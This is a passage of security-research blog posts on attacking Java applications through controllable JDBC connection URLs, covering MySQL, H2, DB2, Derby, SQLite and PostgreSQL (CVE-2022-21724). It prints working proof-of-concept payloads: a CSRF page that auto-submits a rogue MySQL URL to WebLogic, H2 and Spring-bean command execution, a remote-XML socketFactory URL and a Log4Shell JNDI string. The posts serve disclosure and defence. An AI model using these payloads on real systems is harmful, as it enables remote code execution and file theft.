client-side adapters , installed in the client endpoint, not in the server side. It can convert requests from Java programs to a protocol that the DBMS can understand.JDBC drivers provide JDBC specific implementations for different databases . For developers, JDBC helps shield the specifics of individual databases.</p><p>The following simple code fragment gives an example.</p><p><img src="/images/pasted-132.png" alt="upload successful"></p><p>The short code fragment instantiates a <code>DriverManager</code> object to connect to a database driver and log into the database. It occured to me that if the JDBC URL is under control, what will take place?</p><p>According to the above picture, the basic attack assumptive steps are as follow:</p><ul><li><p>Sets a malicious JDBC URL and triggers the JDBC connection. </p></li><li><p>As the client side, it connects to the malicious server which specified by the attacker with JDBC driver. </p></li><li><p>Take advantage of the security flaws or some particular properties of the JDBC drivers to trigger these vulnerabilities.</p></li></ul><p>Before my new research, I focus on some disclosed cases. So it starts with the in-depth analysis of the historical vulnerablities.</p><h5 id="0x03-Review-Historical-Issues"><a href="#0x03-Review-Historical-Issues" class="headerlink" title="0x03 Review Historical Issues"></a>0x03 Review Historical Issues</h5><h6 id="MySQL-Client-Arbitrary-File-Reading-Vulnerability"><a href="#MySQL-Client-Arbitrary-File-Reading-Vulnerability" class="headerlink" title="MySQL Client Arbitrary File Reading Vulnerability"></a>MySQL Client Arbitrary File Reading Vulnerability</h6><p>This vulnerability is caused by the existed MySQL feature for a long time. The feature is that the <code>Load Data Local Infile</code> statement can read client files and send them to the server. There is no doubt that this feature is very risky. The MySQL official document clearly states that clients should not connect to any untrusted server. </p><p>To tell the truth, is that it’s always hard to make sure. And since this is the specification of MySQL, it can affect most clients, including the MySQL JDBC driver. An attacker can forge a malicious MySQL server and after the client connecting, the client will send some initializing query packets such as sending query to <code>SET NAMES</code> with charset <code>utf-8</code>, then the malicious server can send a file transfer packet specifying to read any file from the client.</p><p><img src="/images/pasted-133.png" alt="upload successful"></p><h6 id="MySQL-JDBC-Client-Deserialization-Vulnerability"><a href="#MySQL-JDBC-Client-Deserialization-Vulnerability" class="headerlink" title="MySQL JDBC Client Deserialization Vulnerability"></a>MySQL JDBC Client Deserialization Vulnerability</h6><p>Actually the MySQL JDBC deserialization vulnerability was firstly mentioned by <code>Thijs Alkemade</code> in 2017. </p><p><img src="/images/pasted-135.png" alt="upload successful"></p><p>This report named <code>Unexpected automatic deserialisation of Java objects</code> was assinged as CVE-2017-3523 eventually. Until 2019, a further research is disclosed by <code>ZhangYang</code> and his team mates. They made a presentation named <code>&lt;New Exploit Technique In Java Deserialization Attack&gt;</code> in Black Hat Europe. When MySQL JDBC directly deserializes certain types of data returned from the server, It can result in a remote code execution if the gadgets are appropriate.</p><p><img src="/images/pasted-200.png" alt="upload successful"></p><p>Using the <code>statementInterceptors</code> property provided by the JDBC driver, you can set an interceptor to perform additional operations before or after the certain kinds of statements. The full attacking chains are as follows</p><ul><li>Firstly, set the <code>statementInterceptor</code> attribute to <code>ServerStatusDiffInterceptor</code>, auditing <code>ServerStatusDiffInterceptor</code> code, you can see that this interceptor allows the client to send specific queries to the server, In addition, the <code>getObject</code> method is used to process the returned column. </li></ul><p><img src="/images/pasted-205.png" alt="upload successful"></p><ul><li>Secondly, in the <code>getObject</code> method, the driver will directly call the <code>readObject</code> method for deserialization of binary and blob types. Therefore, the server side controlled by the attacker can trigger deserialization vulnerabilities as long as it returns falsified serialized data.</li></ul><p><img src="/images/pasted-202.png" alt="upload successful"></p><p>Of course, the class and property names of interceptors are different in various version of JDBC driver as shown in the table.</p><p><img src="/images/pasted-137.png" alt="upload successful"></p><h6 id="Weblogic-RCE-involving-MySQL-JDBC-Deserialization"><a href="#Weblogic-RCE-involving-MySQL-JDBC-Deserialization" class="headerlink" title="Weblogic RCE involving MySQL JDBC Deserialization"></a>Weblogic RCE involving MySQL JDBC Deserialization</h6><p>I look for some real world scenarios of MySQL JDBC connection configuration. I suddenly realize that data source can be specified by user in Weblogic server console and MySQL JDBC driver is built-in.Consequently I can customize the JDBC URL with some particular properties. And then I analyze the Weblogic server source code to make sure that. Unfortunately, it needs the authorization. I hope to make it much more harmful, then I figure out there is no CSRF token check of <code>createJDBCDataSourceForm</code>.</p><p><img src="/images/pasted-139.png" alt="upload successful"></p><p>Eventually, I construct the PoC like this</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form name =&quot;wls&quot; target=&quot;frame&quot; action=&quot;http://weblogic-server-ip:7001/console/console.portal?CreateGlobalJDBCDataSourcePortlet_actionOverride=/com/bea/console/actions/jdbc/datasources/createjdbcdatasource/testConnectionConfiguration&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;CreateGlobalJDBCDataSourcePortletdriverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;CreateGlobalJDBCDataSourcePortleturl&quot; value=&quot;jdbc:mysql://rogue-mysql-server-ip:3306/demo?user=root&amp;password=password&amp;characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;iframe name=&quot;frame&quot; style=&quot;display:none&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;document.wls.submit()&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>When the administrator clicks the link of the above HTML page, the remote code will executed. I reported the bugs to Oracle. Then CVE number are assigned as <code>CVE-2020-2869, CVE-2020-2934</code>.</p><p><img src="/images/pasted-140.png" alt="upload successful"></p><h6 id="SpringBoot-H2-Console-RCE-with-JDBC-Driver"><a href="#SpringBoot-H2-Console-RCE-with-JDBC-Driver" class="headerlink" title="SpringBoot H2 Console RCE with JDBC Driver"></a>SpringBoot H2 Console RCE with JDBC Driver</h6><p>When SpringBoot H2 database console is enabled, we can access the endpoit <code>/h2-console/</code> to administrate the H2 database with a web page. </p><p>However,the JDBC URL of H2 database is on supportive of the <code>INIT</code> parameter. It can be utilized to execute an initialization SQL sentence, meanwhile, an external SQL script can be imported by <code>RUNSCRIPT FROM</code>. </p><p><img src="/images/pasted-141.png" alt="upload successful"></p><p>Here is the illustration in SpringBoot H2 console</p><p><img src="/images/pasted-142.png" alt="upload successful"></p><p>First of all, we have to review the source code to figure out why we use the <code>RUNSCRIPT FROM</code> statement.</p><p><img src="/images/pasted-143.png" alt="upload successful"></p><p>During debugging the source code, we know that the <code>INIT</code> property is on supportive of executing any SQL statement, but you have to merge multiple SQL sentences into one. So we naturally choose <code>RUNSCRIPT FROM</code> key word to invoke a remote SQL script.</p><p>Refer to the illustration, there is a disadvantage that a HTTP request is required with <code>RUNSCRIPT FROM</code> key word. Usually establishing a HTTP protocol request to the external network is forbbiden. </p><p>After further testing, I find another way of using <code>\</code> to translate <code>;</code>. multiple sentences are merged into one, that meets all our requirements.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS &#x27;String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd)\;return &quot;test&quot;\;&#125;&#x27;\;CALL EXEC(&#x27;open -a calculator&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-145.png" alt="upload successful"></p><p>Of course, we can use other sentences. The <code>CREATE ALIAS Function</code> key words are combined with an additional <code>CALL</code> key word in multiple SQL sentences, but they are both necessary in the same time. </p><p>After more in-depth analyses of the source code. We find that the <code>JAVA METHOD</code> defined in <code>CREATE ALIAS AS</code> sentence is all handled by the method  <code>SourceCompiler</code>. It supports three kinds of processing logic, <code>Java</code>, <code>JavaScript</code> and <code>Groovy</code>, all of which are compiled in order to finally execute the <code>ALIAS</code> function. </p><p><img src="/images/pasted-144.png" alt="upload successful"></p><p>The <code>parseClass</code> of Groovy catches my eye and it occurs to me that <code>Orange Tsai</code> made a presentation named <code>&lt;Hacking Jenkins Part 2&gt;</code> in 2019. Is is about abusing meta programming. </p><p>Here is the official introduction about the <code>@asttest</code> annotation.</p><p><img src="/images/pasted-146.png" alt="upload successful"></p><p>It is triggered by <code>parseClass</code> method.</p><p><img src="/images/pasted-148.png" alt="upload successful"></p><p>Finally we can execute malicious java code in assertions.</p><p><img src="/images/pasted-147.png" alt="upload successful"></p><p>However, in the real world, Groovy dependencies are not built into H2 database environment. So this attack depends on whether Groovy components are included into the application. Obviously it does not make sense.</p><p>So we continue to look for another way to attack, reviewing the source code, we quickly discover that in addition to the <code>CREATE ALIAS AS</code>  sentence, there is another sentence can input a customized source code. In the parsing of the <code>CREATE Trigger</code> statement, finally, we can call <code>loadFromSource</code> method of the <code>TriggerObject</code> class. We are pleasantly surprised to find that in this method, the javascript source code is not only compiled but also executed. As the source code showing, it calls the <code>eval()</code> method directly. And since <code>ScriptEngine</code> is finally used for execution with no sandbox implement, we could input any java class fragment we wanted in javascript. So with this, we can easily achieve the purpose of RCE without the <code>CALL</code> or other sentences.</p><p><img src="/images/pasted-161.png" alt="upload successful"></p><p>As the PoC shows,JavaScript scripts start with JavaScript comments, and then we can then simply use <code>java.lang.Runtime.getRuntime().exec()</code> method to achieve RCE.</p><p><img src="/images/pasted-162.png" alt="upload successful"></p><h5 id="JBoss-Wildfly-Server-Console-RCE-with-JDBC-Driver"><a href="#JBoss-Wildfly-Server-Console-RCE-with-JDBC-Driver" class="headerlink" title="JBoss /Wildfly Server Console RCE with JDBC Driver"></a>JBoss /Wildfly Server Console RCE with JDBC Driver</h5><p>Here is another sample we use H2 database JDBC driver to execute remote  malicious code, you can refer to the <code>SpringBoot H2 RCE</code> sample.</p><p><img src="/images/pasted-165.png" alt="upload successful"></p><h6 id="IBM-DB2-RCE-with-JDBC-Driver"><a href="#IBM-DB2-RCE-with-JDBC-Driver" class="headerlink" title="IBM DB2 RCE with JDBC Driver"></a>IBM DB2 RCE with JDBC Driver</h6><p>After the above research, I realize some properties of JDBC driver could directly lead to vulnerablities.</p><p>I read the official documents of IBM DB2 JDBC driver to search the potential suspicious properties. I noticed a property called <code>clientRerouteServerListJNDIName</code>, the official description as follows</p><p><img src="/images/pasted-156.png" alt="upload successful"></p><p>As described in the document, if the first connection to the data source fails, this property will provide an alternative server location.The <code>Lookup</code> method of the context is finally called for performing a JNDI lookup according to the source code fragment.</p><p><img src="/images/pasted-158.png" alt="upload successful"></p><p>So it is easy to imagine that if a malicious JNDI location is provided and the client fails to the connect the first location, then it will look up the second malicious JNDI location. Obviously, it is a well-known JNDI injection vulnerability.</p><p><img src="/images/pasted-159.png" alt="upload successful"></p><p>When the client connects to the malicious LDAP server, it will load the malicious java class from the remote codebase.Here is the final PoC</p><p><img src="/images/pasted-160.png" alt="upload successful"></p><h6 id="ModeShape-RCE-with-JDBC-Driver"><a href="#ModeShape-RCE-with-JDBC-Driver" class="headerlink" title="ModeShape RCE with JDBC Driver"></a>ModeShape RCE with JDBC Driver</h6><p><code>ModeShape</code> is a lightweight, fast, and pluggable JCR repository that federates and unifies content from multiple systems, including files systems, databases, configuration files, other repositories, services, applications, and data grids. </p><p><img src="/images/pasted-152.png" alt="upload successful"></p><p>The full name of JCR is Content Repository API for Java is a specification for a Java platform application programming interface API to access content repositories in a uniform manner. Using the JCR API, you can get data from a variety of different systems, including file systems, relational databases and so on.</p><p><img src="/images/pasted-153.png" alt="upload successful"></p><p>A standard JCR connection for ModeShape is in the format shown bellow, which requires <code>repositoryName</code> to make a connection to an existing repository. In this way, the JNDI string in the connection URL gets our attention, and we reasonably assume that in addition to supporting the JCR protocol, other protocols such as LDAP should also be supported. </p><p><img src="/images/pasted-203.png" alt="upload successful"></p><p>After futher testing, it turns out that we can indeed initiate a JNDI lookup request to a specified LDAP server, so this is another typical JNDI injection vulnerability.</p><p><img src="/images/pasted-164.png" alt="upload successful"></p><h6 id="Apache-Derby-with-JDBC-Driver"><a href="#Apache-Derby-with-JDBC-Driver" class="headerlink" title="Apache Derby with JDBC Driver"></a>Apache Derby with JDBC Driver</h6><p>Apache Derby is an open source relational database implemented entirely in java. It can be used as an embedded database just like H2 database. With embedded databases, it is usually easier to implement attacks because the server and client can exist in the same project. </p><p>We find a suspicious java code fragment when we look for sensitive calls in the Apache Derby driver code.There is a <code>readMessage</code> method in the <code>SocketConnection</code> class. The <code>readObject</code> method is invoked directly, which is always used to deserialize input stream in java. This code fragment obviously exists a deserialization vulnerability. In fact, from a security code point of view, this <code>SocketConnection</code> class is suspicious. </p><p><img src="/images/pasted-168.png" alt="upload successful"></p><p>You can see from its construct method, it wraps a socket and wraps  socket <code>Outputstream</code> and <code>Inputstream</code> into object <code>OutputStream</code> and <code>ObjectInputStream</code>.</p><p>The <code>readMessage</code> method seems to read and parse the socket <code>Inputstream</code>. If we can communicate with the wrapped socket, then we will probably be able to trigger the deserialization vulnerability. So we go back to the invocation chains and see how to call the <code>readMessage</code> method.We find that the caller is the inner class <code>MasterReceiverThread</code> of <code>ReplicationMessageTransmit</code> class.</p><p><img src="/images/pasted-169.png" alt="upload successful"></p><p>As you can guess from the class names and package names. These code fragments are relate to <code>Apache Derby</code> feature to replicate databases. I go through the <code>Apache Derby</code> documentation section on replicating databases and know that database replication can be initiated with JDBC connection property, which is exactly what we need. Also the connection property is controllable.</p><p>In fact, if you go all the way up the call chain, you can see that whether this thread is started depends on whether the <code>startMaster</code> property is enabled. As the code showing, <code>isStartReplicationMasterBoot</code> method used for judgment. And in the code ,we can find that we can specify which host the socket connects to by controlling the <code>slaveHost</code> property. So we can set the <code>startMaster</code> property as <code>true</code> and the <code>slaveHost</code> property to the malicious server, then <code>Apache Derby</code> will try to connect to the malicious slave server and communicate with each other. At this point, the responsed malicious serialization data stream will be automatically deserialized, thus achieving the RCE purpose. </p><p><img src="/images/pasted-207.png" alt="upload successful"></p><p>The malicious connection PoC in the following code</p><p><img src="/images/pasted-208.png" alt="upload successful"></p><p>And the evil slave sever code is as follows</p><p><img src="/images/pasted-209.png" alt="upload successful"></p><p>Obviously the evil slave sever can return the serialized data directly after the connection receiving.</p><h5 id="SQLite-RCE-with-JDBC-Driver"><a href="#SQLite-RCE-with-JDBC-Driver" class="headerlink" title="SQLite RCE with JDBC Driver"></a>SQLite RCE with JDBC Driver</h5><p>SQLite is also a lightweight embedded database. How to exploit it?</p><p><img src="/images/pasted-170.png" alt="upload successful"></p><p>we look up the code for its connection and find that when the JDBC URL is controllable, then we can customize its <code>resourceName</code> in the <code>open</code> method as follows </p><p><img src="/images/pasted-181.png" alt="upload successful"></p><p>Stepping into the <code>extractResource</code> method, we can see that the URL  constructed by <code>resourceName</code> calls <code>openStream</code> method , so this can be used to achieve the SSRF attack as follow,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:sqlite::resource:http://127.0.0.1:8888/poc1.db</span><br></pre></td></tr></table></figure><p>Send an HTTP request to specific ip address with JDBC connection. However, SSRF attack is not stratified our purpose. </p><p><img src="/images/pasted-172.png" alt="upload successful"></p><p>Using the resource subprotocol of SQLite, you can connect to the specified IP to download the specific database files, that is, if the JDBC URL is under our control, we can control the database files which the client side opens.With these clues, how should we attack? </p><p><img src="/images/pasted-210.png" alt="upload successful"></p><p>Referring to <code>&lt;SELECT code_execution FROM * USING SQLite&gt;</code> which descripts how to gain code execution using a malicious SQLite database. We can consider a scenario that there is a controllable JDBC URL and an uncontrollable <code>SELECT</code> statement. </p><p>A brief code is shown in the figure. The URL is controllable, but the SQL statement executed are not controllable. </p><p><img src="/images/pasted-211.png" alt="upload successful"></p><p>In the controllable database file, there is a <code>Data Definition Languae (DDL)</code> statements used to <code>CREATE TABLE</code> or <code>VIEW</code>. The DDL statements actually appear as a plain text. If we inspect that the uncontrollable statement is <code>SELECT * from TABLE</code>, we can <code>CREATE VIEW</code> names <code>pyn3rd</code> to hijack the <code>SELECT</code> statement to execute a subquery customized in the <code>CREATE VIEW</code> DDL file. In this way, we can transform the SQL statement that we cannot control into the query statement that we can control. </p><p><img src="/images/pasted-212.png" alt="upload successful"></p><p>The next step, if we have a controllable JDBC URL connection, we can enable the <code>load_extension</code> option in SQLite. So if we have a controlled file, we can archive RCE purpose by loading this extension. In fact, the extension is a <code>Dynamic Link Library</code> or <code>Shared Object</code>. In <code>SELECT</code> statement, <code>load_extension</code> function can load a <code>.ddl</code> or <code>.so</code> file and execute <code>sqlite3_extension_init</code> function in it. So input the malicious code in <code>sqlite3_extension_init</code> function can trigger the remote code excution.</p><p><img src="/images/pasted-178.png" alt="upload successful"></p><p>Actually getting a manageable file is not always easy. Since Sqlite often bursts memory corruptions vulnerabilities, we can use these memory corruptions to attack. As shown in the code bellow, we can use <code>Magellan</code> PoC to create a local SQLite database with a malicious security <code>VIEW</code>.</p><p><img src="/images/pasted-179.png" alt="upload successful"></p><p>The <code>Magellan</code> is a number of vulnerabilities that exist in SQLite caused by memory corruptions.Specify a JDBC connection to download our database file and open it. When the code executes to query for security table, it will trigger a JVM crash.</p><p><img src="/images/pasted-180.png" alt="upload successful"></p><p>However, RCE is the final objective. Here is the PoC</p><p><img src="/images/pasted-212.png" alt="upload successful"></p><h5 id="Open-Source-Project-JDBC-Attack-Defense-Policy"><a href="#Open-Source-Project-JDBC-Attack-Defense-Policy" class="headerlink" title="Open Source Project JDBC Attack Defense Policy"></a>Open Source Project JDBC Attack Defense Policy</h5><p>According to the previous attack methods, we can find that vulnerabilities usually appear in some special JDBC properties. So some open source projects take the method of filtering sensitive properties to fix such vulnerabilities. <code>Apache Druid</code> as well as <code>Apache DolphinScheduler</code> have been exposed to MySQL JDBC deserialization vulnerabilities in the past, so we focus on the two open source softwares . The CVE numbers for the two vulnerabilities are <code>CVE-2021-26919</code> and <code>CVE-2020-11974</code>.</p><p><code>Apache Druid</code> defines a whitelist of properties. Only the properties in the whitelist are permitted.</p><p><img src="/images/pasted-184.png" alt="upload successful"></p><p>Otherwise, <code>Apache DolphinScheduler</code> removes sensitive properties from parameters. </p><p><img src="/images/pasted-185.png" alt="upload successful"></p><ul><li>Is there a new exploitable way to bypass property filter?</li></ul><p>We choose <code>Apache Druid</code>, which uses the <code>MySQL-connector-5.1.48</code> as our target. For this fix, the first idea is to see if the filter parameters method is consistent with the JDBC connection processing parameters method. </p><p><img src="/images/pasted-187.png" alt="upload successful"></p><p>You can see in the <code>Apache Druid</code> source code that the filter use the MySQL connector default parse URL method.By default they are consistent. </p><p><img src="/images/pasted-188.png" alt="upload successful"></p><p>Therefore, we jump out of this idea and take a look at the overall JDBC Driver loading logic.</p><p>For the loading of JDBC Driver, they use SPI technology.full name is  Java Service Provider Interface. For JDBC, all registered drivers are stored in the <code>java.sql.Driver</code>.In 5.1.48 versions of MySQL connector ,there are two registerd drivers, one is the common JDBC driver, the other is <code>FabricMySQLDriver</code>.</p><p><img src="/images/pasted-189.png" alt="upload successful"></p><p>This <code>FabricMySQLDriver</code> has caught our attention. Refer to the MySQL driver documentation, you can see that <code>FabricMySQLDriver</code> is used to connect to the MySQL Fabric System. MySQL Fabric is a system for managing a farm of MySQL servers. </p><p><img src="/images/pasted-190.png" alt="upload successful"></p><p>We start researching in the source code of <code>FabricMySQLDriver</code>.If you pass in a URL that starts with the format as the code showing, it goes into the <code>Fabric Driver</code> processing logic. </p><p><img src="/images/pasted-192.png" alt="upload successful"></p><p>You can see that in the code the connection URL is concated by the <code>FabricProtocol</code>, <code>Host</code> and <code>Port</code> parameters. Trace the FabricProtocol parameter,We can  find that it is default to HTTP protocol . Enter the FabricConnection method, In this case, you can see that it uses the XMLRPC Client.</p><p><img src="/images/pasted-193.png" alt="upload successful"></p><p>Continuing to step into it, we find that it finally makes an XMLRPC call in the <code>errorSafeCall</code> Method and we can specify  host and port of this call. </p><p><img src="/images/pasted-194.png" alt="upload successful"></p><p>So it looks like we’ve got an SSRF vulnerability, but it’s not enough. Similar to the MySQL deserialization vulnerability, we go on seeing if the Fabric MySQL driver had made any errors during processing the revieved data.</p><p><img src="/images/pasted-195.png" alt="upload successful"></p><p>It is clearly visible in the code that it use the <code>newSAXParser</code> method of the <code>SAXParserFactory</code> directly to get a <code>SAXParser</code>, where the <code>SAXParserFactory</code> does not set any security attributes, is an obvious XXE vulnerability, which finally can cause an arbitity file reading or SSRF attack.</p><p><img src="/images/pasted-196.png" alt="upload successful"></p><p>So the idea of attack is very clear. We construct a specific JDBC URL to enter the processing logic of <code>Farbic Driver</code>, set the <code>Host</code> and <code>Port</code> in the JDBC URL to our malicious HTTP server and when the client establishes a connection, it will send an XMLRPC request to the server. We control the HTTP server to return a malicious XML document ,and then XXE vulnerability will be triggered when the client processes this XML Documnet. We can read the corresponding files from the client by using the out-of-band XML External Entity attack.</p><p>The connection code of the client is shown in the figure. We can trigger the XXE vulnerability without any parameters. </p><p><img src="/images/pasted-197.png" alt="upload successful"></p><p>The malicious HTTP service code is shown as follows.To constrocut the mailicious XML Documnet is easy.</p><p><img src="/images/pasted-198.png" alt="upload successful"></p><h5 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h5><p>We have researched on JDBC attacks of the diverse main stream databases for a couple of weeks.Making the JDBC URLs customized will carry a big risk.It is recommended that if you have to make JDBC URLs customized, you should  strictly restrict the JDBC URLs either properties or protocols.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Make JDBC Attacks Brilliant Again II</title>
      <link href="/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/"/>
      <url>/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/</url>
      
        <content type="html"><![CDATA[<h5 id="0x01-Forewords"><a href="#0x01-Forewords" class="headerlink" title="0x01 Forewords"></a>0x01 Forewords</h5><p>I made a presentation about JDBC attack interface at HITB Singapore security conference in 2021. </p><p>The title of this talk is <code>&lt;Make JDBC Attacks Brilliant Again&gt;</code> , if you are interested, the slide link is as follow</p><p><a href="https://conference.hitb.org/files/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&amp;%20Chen%20Hongkun.pdf">https://conference.hitb.org/files/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&amp;%20Chen%20Hongkun.pdf</a></p><p>However PostgreSQL database was not included in that presentation, and recently JDBC attacks in PostgreSQL database is mentioned. So I make a capsule write-up , I consider it is the exta chapter of <code>&lt;Make JDBC Attacks Brilliant Again&gt;</code>.</p><h5 id="0x02-PostgreSQL-JDBC-Driver-Remote-Code-Execution（CVE-2022-21724）"><a href="#0x02-PostgreSQL-JDBC-Driver-Remote-Code-Execution（CVE-2022-21724）" class="headerlink" title="0x02 PostgreSQL JDBC Driver Remote Code Execution（CVE-2022-21724）"></a>0x02 PostgreSQL JDBC Driver Remote Code Execution（CVE-2022-21724）</h5><p>Just like other JDBC drivers, PostgreSQL JDBC driver is on supportive of many properties. Let me start with the pair of properties in <code>CVE-2022-21724</code></p><p><strong>a. socketFactory / socketFactoryArg</strong></p><p>Official document introduction</p><p><img src="/images/pasted-108.png" alt="upload successful"></p><p>As always, debug and figure out the internal function calling procedure, here, my PostgreSQL driver version is 42.3.1, I write the following code in order to print version.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(&quot;PostgreSQL Driver Version: &quot; + org.postgresql.Driver.class.getPackage().getImplementationVersion());</span><br></pre></td></tr></table></figure><p>Set the property empty and execute the code, it throws exceptions.</p><p><img src="/images/pasted-109.png" alt="upload successful"></p><p>Refer to the exceptions, set tne breakpoint at <code>getSocketFactory()</code></p><p><img src="/images/pasted-110.png" alt="upload successful"></p><p>Then step into <code>ObjectFactory.instantiate()</code></p><p><img src="/images/pasted-111.png" alt="upload successful"></p><p>According to this, we figure out <code>socketFactory</code> is used to initialize objects and there is only one string type argument of the constructor.</p><p>Therefore we only need to look for an eligible class, it reminds me of the couple of classes as follow </p><ul><li><p>org.springframework.context.support.ClassPathXmlApplicationContext</p></li><li><p>org.springframework.context.support.FileSystemXmlApplicationContext</p></li></ul><p>We can load the following XML file by one of the above classes</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">    &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;</span><br><span class="line">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">        &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</span><br><span class="line">            &lt;constructor-arg &gt;</span><br><span class="line">            &lt;list&gt;</span><br><span class="line">                &lt;value&gt;open&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;-a&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;calculator&lt;/value&gt;</span><br><span class="line">            &lt;/list&gt;</span><br><span class="line">            &lt;/constructor-arg&gt;</span><br><span class="line">        &lt;/bean&gt;</span><br><span class="line">    &lt;/beans&gt;</span><br></pre></td></tr></table></figure><p>Start a ftp server</p><p><code>python3 -m pyftpdlib -d .</code></p><p>Check the result</p><p><img src="/images/pasted-112.png" alt="upload successful"></p><p>Maybe it also reminds someone of another class, like  <code>java.io.FileOutputStream</code>. Utilize the class and <code>../../</code> to archive traveral path and empty an file arbitrarily. In my illustation, I create an empty file named <code>test.log</code>.</p><p><img src="/images/pasted-113.png" alt="upload successful"></p><p><strong>b. sslFactory / sslFactoryArg</strong></p><p>Official document introduction</p><p><img src="/images/pasted-114.png" alt="upload successful"></p><p>Actually, they are as similar as <code>socketFactory/socketFactoryArg</code>, only a little differencs, the couple of properties are utilized to judge whether it is an encrypted connection with a SSL handshake.<br>About SSL handshake judgement, we can figure out if the recieved request starting with big letter <code>S</code> after establishing connection, it is on supportive of SSL protocol.</p><p>Then step into <code>SSLSocketFactory()</code></p><p><img src="/images/pasted-115.png" alt="upload successful"></p><p>Next step, focus on <code>SSLSocketFactory</code></p><p><img src="/images/pasted-116.png" alt="upload successful"></p><p><img src="/images/pasted-117.png" alt="upload successful"></p><p>From here on, the code logic is the same as before.To avoid repetition, it’s not described in this article.Consequently we only give a response with big letter <code>S</code> after establishing connection, it will be trigged successfully.</p><p><img src="/images/pasted-118.png" alt="upload successful"></p><p><strong>c. Weblogic Server Remote Code Execution</strong></p><p>I mentioned this class <code>org.springframework.context.support.FileSystemXmlApplicationContext </code> in the above illustration.But in Weblogic Server, there is a similar class <code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code></p><p>Pay attention to check these two jar files as follow</p><p><img src="/images/pasted-119.png" alt="upload successful"></p><p>They are both necessary, fortunately built-in by default.</p><p>Finnally construct the PoC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql://127.0.0.1:5432/testdb?&amp;socketFactory=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&amp;socketFactoryArg=ftp://127.0.0.1:2121/bean.xml</span><br></pre></td></tr></table></figure><p>Check the result</p><p><img src="/images/pasted-121.png" alt="upload successful"></p><h5 id="0x03-PostgreSQL-JDBC-Driver-arbitrary-file-write"><a href="#0x03-PostgreSQL-JDBC-Driver-arbitrary-file-write" class="headerlink" title="0x03 PostgreSQL JDBC Driver arbitrary file write"></a>0x03 PostgreSQL JDBC Driver arbitrary file write</h5><p><strong>a. loggerLevel / loggerFile</strong></p><p>Official document introduction</p><p><img src="/images/pasted-122.png" alt="upload successful"></p><p>So PoC can be contructed like this</p><p><code>jdbc:postgresql://localhost:5432/testdb?loggerLevel=TRACE&amp;loggerFile=pgjdbc.log </code></p><p><strong>b. Log4Shell Logger Injection</strong></p><p>Apparently even though the database connection is failed, all the logs will be written into the specific log file. In order to pollute the log file, we can insert <code>Log4Shell</code> payload into JDBC connection URL.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql://localhost:5432/$&#123;jndi:ldap://127.0.0.1:1389/eajmgl&#125;?loggerLevel=TRACE&amp;loggerFile=pgjdbc.log</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-123.png" alt="upload successful"></p><p>When using Apache Log4j2 library to read polluted log file, RCE will be triggered. </p><p><img src="/images/pasted-124.png" alt="upload successful"></p><p><strong>c. Weblogic Server Concise Webshell</strong></p><p>In order to check the result easily, I use another property <code>ApplicationName</code>. Honestly it’s not 